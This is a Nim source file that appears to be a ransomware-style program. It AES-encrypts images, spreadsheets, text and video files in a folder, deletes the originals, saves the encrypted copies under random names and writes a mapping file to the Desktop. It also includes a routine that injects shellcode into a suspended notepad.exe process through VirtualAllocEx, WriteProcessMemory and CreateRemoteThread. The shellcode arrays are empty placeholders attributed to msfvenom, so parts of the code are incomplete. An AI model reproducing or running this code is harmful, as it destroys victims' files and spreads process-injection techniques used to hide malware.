import winim/lean
import osproc
import nimcrypto, os, strutils, random
proc generateRandomName(): string =
  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  var result = newString(16)
  for i in 0..15:
    result[i] = charset[rand(0..charset.high)]
  return result


proc encryptFile(filePath: string, key: string, iv: string): string =
  var ectx: CBC[aes256]
  var fileContent = readFile(filePath)

  let blockSize = aes256.sizeBlock
  let paddingSize = blockSize - (fileContent.len mod blockSize)
  fileContent.add(chr(paddingSize).repeat(paddingSize))

  var encText = newString(fileContent.len)
  var keyStr = newString(aes256.sizeKey)
  var ivStr = newString(aes256.sizeBlock)
  copyMem(addr keyStr[0], unsafeAddr key[0], min(len(key), aes256.sizeKey))
  copyMem(addr ivStr[0], unsafeAddr iv[0], min(len(iv), aes256.sizeBlock))

  ectx.init(keyStr, ivStr)
  ectx.encrypt(fileContent, encText)
  ectx.clear()

  let randomName = generateRandomName()
  let (dir, _, _) = splitFile(filePath)
  let encryptedFilePath = dir / (randomName)
  writeFile(encryptedFilePath, encText)

  removeFile(filePath)
  echo "Original file deleted: ", filePath
  echo "File encrypted successfully: ", encryptedFilePath

  return randomName

proc encryptFolder(folder: string) =
  var filesEncrypted = 0
  var filesSkipped = 0
  var encryptionMap: string = ""

  echo "Encrypting files in folder: ", folder

  if not dirExists(folder):
    echo "The specified folder does not exist: ", folder
    return

  for kind, path in walkDir(folder):
    if kind == pcFile:
      echo "Found file: ", path
      try:
        let key = "dniwasdajdaoidjoiajsdoijo"
        let iv = "0123456789ABCDEF"

        let fileSize = getFileSize(path)
        if fileSize == 0:
          echo "Skipping empty file: ", path
          inc(filesSkipped)
          continue

        let (_, name, ext) = splitFile(path)
        if ext.toLowerAscii() notin [".jpg", ".png", ".txt", ".xlsx", ".xls",".jpeg",".xls",".mp4"]:
          echo "Skipping file with unsupported extension: ", path
          inc(filesSkipped)
          continue

        echo "Attempting to encrypt file: ", path
        let encryptedName = encryptFile(path, key, iv)
        encryptionMap.add(path & " -> " & folder & "\\" & encryptedName & "\n")
        inc(filesEncrypted)
      except IOError as e:
        echo "IO Error reading file: ", path
        echo "Error message: ", e.msg
      except:
        echo "Error encrypting file: ", path
        echo "Error message: ", getCurrentExceptionMsg()

  echo "Total files encrypted: ", filesEncrypted
  echo "Total files skipped: ", filesSkipped
  let desktopPath = getEnv("USERPROFILE") & "/Desktop"
  let mapFilePath = desktopPath / "encrypt.txt"
  writeFile(mapFilePath, encryptionMap)
  echo "Encryption map saved to: ", mapFilePath


randomize()

proc injectCreateRemoteThread[I, T](shellcode: array[I, T], folder: string): void =
  # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
  let tProcess = startProcess("notepad.exe")
  tProcess.suspend() # That's handy!
  defer: tProcess.close()

  echo "[*] Target Process: ", tProcess.processID

  let pHandle = OpenProcess(
      PROCESS_ALL_ACCESS,
      false,
      cast[DWORD](tProcess.processID)
  )
  defer: CloseHandle(pHandle)

  echo "[*] pHandle: ", pHandle

  let rPtr = VirtualAllocEx(
      pHandle,
      NULL,
      cast[SIZE_T](shellcode.len),
      MEM_COMMIT,
      PAGE_EXECUTE_READ_WRITE
  )

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(
      pHandle,
      rPtr,
      unsafeAddr shellcode,
      cast[SIZE_T](shellcode.len),
      addr bytesWritten
  )

  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  let tHandle = CreateRemoteThread(
      pHandle,
      NULL,
      0,
      cast[LPTHREAD_START_ROUTINE](rPtr),
      NULL,
      0,
      NULL
  )
  defer: CloseHandle(tHandle)

  echo "[*] tHandle: ", tHandle
  echo "[+] Injected"

  # Call the encryptFolder function here
  encryptFolder(folder)

when defined(windows):

  # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
  when defined(i386):
    # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
    echo "[*] Running in x86 process"
    var shellcode: array[272, byte] = [
    byte ]
  elif defined(amd64):
    # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
    echo "[*] Running in x64 process"
    var shellcode: array[295, byte] = [
    byte ]




when isMainModule:
  let folder = getCurrentDir() / "files"
  if defined(windows) and (defined(i386) or defined(amd64)):
    var shellcode: array[272, byte] = [
    byte ]
    injectCreateRemoteThread(shellcode,folder)
